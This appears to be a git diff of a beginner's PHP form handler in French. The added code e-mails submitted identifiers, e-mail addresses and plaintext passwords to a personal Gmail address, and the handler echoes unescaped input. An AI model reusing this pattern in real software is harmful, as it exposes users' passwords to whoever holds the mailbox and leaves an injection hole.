@@ -20,7 +20,6 @@ if ($action == 'mailer') {
     $cgu = $_POST['cgu'];
 
     $message = 'Identifiant: ' . $id . PHP_EOL ;
-    $message .= "\t";
     $message .= 'Sexe : ' . $sexe . PHP_EOL;
     $message .= 'E-mail : ' . $email . PHP_EOL;
     $message .= 'Password : ' . $mdp . PHP_EOL;
@@ -29,8 +28,8 @@ if ($action == 'mailer') {
     echo $message;
 
 }
-else {
-    echo '<br/><strong>Bouton non géré !</strong><br/>';
-    }
+if (mail('godestj@gmail.com', 'cc', $message))
+    echo 'Mail envoyé !';
+else echo 'Mail non envoyé :(';
 
 ?>
